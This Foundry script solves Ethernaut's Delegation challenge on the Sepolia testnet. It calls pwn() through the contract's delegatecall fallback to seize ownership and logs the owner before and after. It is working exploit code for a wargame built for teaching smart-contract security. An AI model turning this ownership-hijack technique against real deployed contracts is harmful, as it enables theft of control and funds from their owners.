// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation, Delegate} from "../../src/ethernaut/06.sol";

// forge script script/ethernaut/06.s.sol --rpc-url $SEPOLIA_RPC_URL --account PK1_SEPOLIA --sender <ADDRESS> --broadcast -vvvv

contract DelegationScript is Script {
    Delegation public delegationContract =
        Delegation(0xD206556Fac8Ab8D1E570D9CF317745BE5D245874);
    Delegate public delegateContract;

    function run() public {
        vm.startBroadcast();
        console.log("Delegation owner before: ", delegationContract.owner());
        (bool ok, ) = address(delegationContract).call(
            abi.encodeWithSelector(Delegate.pwn.selector)
        );
        require(ok, "Failed to call pwn");
        // (bool ok, ) = address(delegationContract).call(abi.encodeWithSignature("pwn()"));
        // require(ok, "Failed to call pwn");
        console.log("Delegation owner after: ", delegationContract.owner());
        vm.stopBroadcast();
    }
}
